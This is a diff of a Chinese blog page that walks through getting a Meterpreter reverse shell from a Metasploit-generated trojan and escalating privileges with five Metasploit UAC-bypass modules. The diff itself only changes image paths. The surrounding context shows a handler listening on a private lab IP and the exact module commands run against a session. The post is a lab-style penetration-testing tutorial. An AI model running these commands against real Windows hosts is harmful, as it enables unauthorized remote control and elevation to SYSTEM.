@@ -94,17 +94,17 @@
 <meta property="og:site_name" content="Jacky Cheng">
 <meta property="og:description" content="前言 攻击环境 获取shell UAC提权    一. 前言前段时间有做过一次内核提权的尝试，不过没有成功，主要还是权限控制的比较严格，并且该打的补丁都打了。但是方法还是有用的，还有就是思路流程总结一下。">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="d:/github_blog/source/image/meterpreter-UACgetSystem/1.jpg">
-<meta property="og:image" content="d:/github_blog/source/image/meterpreter-UACgetSystem/2.webp">
-<meta property="og:image" content="d:/github_blog/source/image/meterpreter-UACgetSystem/3.webp">
-<meta property="og:image" content="d:/github_blog/source/image/meterpreter-UACgetSystem/4.webp">
-<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/wpkib3J60o29Fd5IWpLezsv38OjzK3gYMMUH0ajo9h6XN0Aw6lAEWicEtOFDnf9XxwRlPE7b8cpBpnbUDN9u4JhA/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1">
-<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/wpkib3J60o29Fd5IWpLezsv38OjzK3gYMKOe7guN6icaORbH4K6nGSN6ibua1PnibCPRia8n6hIT4tpaLxKBAESnRlw/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1">
-<meta property="og:updated_time" content="2019-07-29T06:23:06.748Z">
+<meta property="og:image" content="https://cjjkkk.github.io/image/meterpreter-UACgetSystem/1.jpg">
+<meta property="og:image" content="https://cjjkkk.github.io/image/meterpreter-UACgetSystem/2.webp">
+<meta property="og:image" content="https://cjjkkk.github.io/image/meterpreter-UACgetSystem/3.webp">
+<meta property="og:image" content="https://cjjkkk.github.io/image/meterpreter-UACgetSystem/4.webp">
+<meta property="og:image" content="https://cjjkkk.github.io/image/meterpreter-UACgetSystem/5.webp">
+<meta property="og:image" content="https://cjjkkk.github.io/image/meterpreter-UACgetSystem/6.webp">
+<meta property="og:updated_time" content="2019-07-29T06:29:32.914Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Metasploit生成木马文件获取shell和UAC提权操作">
 <meta name="twitter:description" content="前言 攻击环境 获取shell UAC提权    一. 前言前段时间有做过一次内核提权的尝试，不过没有成功，主要还是权限控制的比较严格，并且该打的补丁都打了。但是方法还是有用的，还有就是思路流程总结一下。">
-<meta name="twitter:image" content="d:/github_blog/source/image/meterpreter-UACgetSystem/1.jpg">
+<meta name="twitter:image" content="https://cjjkkk.github.io/image/meterpreter-UACgetSystem/1.jpg">
 
 
 
@@ -436,7 +436,7 @@
 <p><br></p>
 <h3 id="3-2-启用MSF监听"><a href="#3-2-启用MSF监听" class="headerlink" title="3.2 启用MSF监听"></a>3.2 启用MSF监听</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">show options				//查看那些参数是需要输入的</span><br><span class="line">set lhost 192.168.28.156 	 //设置监听的IP</span><br><span class="line">set lport 8585 				//设置监听的端口</span><br><span class="line">run/exploit</span><br></pre></td></tr></table></figure>
 <p><br></p>
-<h3 id="3-3-投放木马并运行"><a href="#3-3-投放木马并运行" class="headerlink" title="3.3 投放木马并运行"></a>3.3 投放木马并运行</h3><h3 id="3-4-获取shell"><a href="#3-4-获取shell" class="headerlink" title="3.4 获取shell"></a>3.4 获取shell</h3><p><img src="D:\github_blog\source\image\meterpreter-UACgetSystem\1.jpg" alt="1"></p>
+<h3 id="3-3-投放木马并运行"><a href="#3-3-投放木马并运行" class="headerlink" title="3.3 投放木马并运行"></a>3.3 投放木马并运行</h3><h3 id="3-4-获取shell"><a href="#3-4-获取shell" class="headerlink" title="3.4 获取shell"></a>3.4 获取shell</h3><p><img src="\image\meterpreter-UACgetSystem\1.jpg" alt="1"></p>
 <p><br></p>
 <h2 id="四-UAC提权"><a href="#四-UAC提权" class="headerlink" title="四. UAC提权"></a>四. UAC提权</h2><p>在获取到shell之后，可以先测试一下命令测试权限</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">getsystem</span><br><span class="line">getuid</span><br></pre></td></tr></table></figure>
@@ -445,20 +445,20 @@
 <h3 id="4-1-Windows升级UAC保护绕过"><a href="#4-1-Windows升级UAC保护绕过" class="headerlink" title="4.1 Windows升级UAC保护绕过"></a>4.1 Windows升级UAC保护绕过</h3><p>此模块将通过进程注入利用受信任的发布者证书绕过Windows UAC。这将产生第二个shell，而且UAC保护已经关闭。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/windows/local/bypassuac</span><br><span class="line">msf exploit windows/local/bypassuac) &gt; set session 1</span><br><span class="line">msf exploit(windows/local/bypassuac) &gt; exploit</span><br></pre></td></tr></table></figure>
 <p>从下图可以看到，又建立了一个meterpreter会话2连接，现在输入getsystem和getuid两条命令来查看系统权限：</p>
-<p><img src="D:\github_blog\source\image\meterpreter-UACgetSystem\2.webp" alt="2"></p>
+<p><img src="\image\meterpreter-UACgetSystem\2.webp" alt="2"></p>
 <h3 id="4-2-Windows升级UAC保护绕过（内存注入）"><a href="#4-2-Windows升级UAC保护绕过（内存注入）" class="headerlink" title="4.2 Windows升级UAC保护绕过（内存注入）"></a>4.2 Windows升级UAC保护绕过（内存注入）</h3><p>此模块将通过进程注入利用受信任的发布者证书绕过Windows UAC。这将产生第二个shell，而且UAC保护已经关闭。此模块使用反射DLL注入技术仅删除DLLpayload二进制文件而不是删除标准技术中的三个单独的二进制文件。但是，它需要选择正确的体系结构（对于SYSWOW64系统也使用x64）。如果指定EXE :: Custom，你的DLL应该在单独的进程中启动payload后调用ExitProcess()。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/windows/local/bypassuac_injection</span><br><span class="line">msf exploit(windows/local/bypassuac_injection) &gt; set session 1</span><br><span class="line">msf exploit(windows/local/bypassuac_injection) &gt; exploit</span><br></pre></td></tr></table></figure>
 <p>从下图中可以看出，meterpreter 会话2已经成功打开，现在输入getsystem和getuid两条命令来查看权限</p>
-<p><img src="D:\github_blog\source\image\meterpreter-UACgetSystem\3.webp" alt="3"></p>
+<p><img src="\image\meterpreter-UACgetSystem\3.webp" alt="3"></p>
 <h3 id="4-3-Windows升级UAC保护绕过（FodHelper注册表键值绕过）"><a href="#4-3-Windows升级UAC保护绕过（FodHelper注册表键值绕过）" class="headerlink" title="4.3 Windows升级UAC保护绕过（FodHelper注册表键值绕过）"></a>4.3 Windows升级UAC保护绕过（FodHelper注册表键值绕过）</h3><p>此模块将通过在当前用户配置单元下劫持注册表中的特殊键并插入将在启动Windows fodhelper.exe应用程序时调用的自定义命令来绕过Windows 10 UAC。这将产生第二个shell，而且UAC保护已经关闭。此模块修改注册表项，但在调用payload后清除该项。该模块不要求payload的结构与OS匹配。如果指定EXE :: Custom，你的DLL应该在单独的进程中启动payload后调用ExitProcess()。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/windows/local/bypassuac_fodhelper</span><br><span class="line">msf exploit(windows/local/bypassuac_fodhelper) &gt; set session 1</span><br><span class="line">msf exploit(windows/local/bypassuac_fodhelper) &gt; exploit</span><br></pre></td></tr></table></figure>
-<p><img src="D:\github_blog\source\image\meterpreter-UACgetSystem\4.webp" alt="4"></p>
+<p><img src="\image\meterpreter-UACgetSystem\4.webp" alt="4"></p>
 <h3 id="4-4-Windows升级UAC保护绕过（Eventvwr注册表键值绕过）"><a href="#4-4-Windows升级UAC保护绕过（Eventvwr注册表键值绕过）" class="headerlink" title="4.4 Windows升级UAC保护绕过（Eventvwr注册表键值绕过）"></a>4.4 Windows升级UAC保护绕过（Eventvwr注册表键值绕过）</h3><p>此模块将通过在当前用户配置单元下劫持注册表中的特殊键并插入自定义命令，这个命令将在启动Windows fodhelper.exe应用程序时调用来绕过Windows 10 UAC。这将产生第二个shell，而且UAC保护已经关闭。此模块修改注册表项，但在调用payload后清除该项。该模块不要求payload的结构与OS匹配。如果指定EXE :: Custom，你的DLL应该在单独的进程中启动payload后调用ExitProcess()。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/windows/local/bypassuac_eventvwr</span><br><span class="line">msf exploit(windows/local/bypassuac_eventvwr) &gt; set session 1</span><br><span class="line">msf exploit(windows/local/bypassuac_eventvwr) &gt; exploit</span><br></pre></td></tr></table></figure>
-<p><img src="https://mmbiz.qpic.cn/mmbiz_png/wpkib3J60o29Fd5IWpLezsv38OjzK3gYMMUH0ajo9h6XN0Aw6lAEWicEtOFDnf9XxwRlPE7b8cpBpnbUDN9u4JhA/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="img"></p>
+<p><img src="\image\meterpreter-UACgetSystem\5.webp" alt="5"></p>
 <h3 id="4-5-Windows升级UAC保护绕过（COM-Handler劫持绕过）"><a href="#4-5-Windows升级UAC保护绕过（COM-Handler劫持绕过）" class="headerlink" title="4.5 Windows升级UAC保护绕过（COM Handler劫持绕过）"></a>4.5 Windows升级UAC保护绕过（COM Handler劫持绕过）</h3><p>此模块将通过在HKCU配置单元中创建COM处理程序注册表项来绕过Windows UAC。加载某些高完整性进程时，会引用这些注册表项，从而导致进程加载用户控制的DLL。这些DLL包含导致会话升级的payload。在payload调用后清除注册表项修改。此模块要求payload的体系结构与OS匹配，但当前的低权限Meterpreter会话的体系结构并不相同。如果指定EXE :: Custom，你的DLL应该在单独的进程中启动payload后调用ExitProcess（）。此模块通过目标上的cmd.exe调用目标二进制文件。因此，如果限制cmd.exe访问，则此模块将无法正常运行。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/windows/local/bypassuac_comhijack</span><br><span class="line">msf exploit(windows/local/bypassuac_comhijack) &gt; set session 1</span><br><span class="line">msf exploit(windows/local/bypassuac_comhijack) &gt; exploit</span><br></pre></td></tr></table></figure>
-<p><img src="https://mmbiz.qpic.cn/mmbiz_png/wpkib3J60o29Fd5IWpLezsv38OjzK3gYMKOe7guN6icaORbH4K6nGSN6ibua1PnibCPRia8n6hIT4tpaLxKBAESnRlw/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="img"></p>
+<p><img src="\image\meterpreter-UACgetSystem\6.webp" alt="6"></p>
 <p><br></p>
 <p>参考：<a href="https://mp.weixin.qq.com/s?__biz=MzI0MDY1MDU4MQ==&amp;mid=2247489975&amp;idx=2&amp;sn=31e8c3ff4a277f3e9f41de2f4b40dc3d&amp;chksm=e916c98dde61409b4a819cb1b38e377d0283853d95abb69a76bd1ff49e53579a8589baacd3e5&amp;mpshare=1&amp;scene=23&amp;srcid=##" target="_blank" rel="noopener">利用metasploit绕过UAC的5种方式</a></p>
 
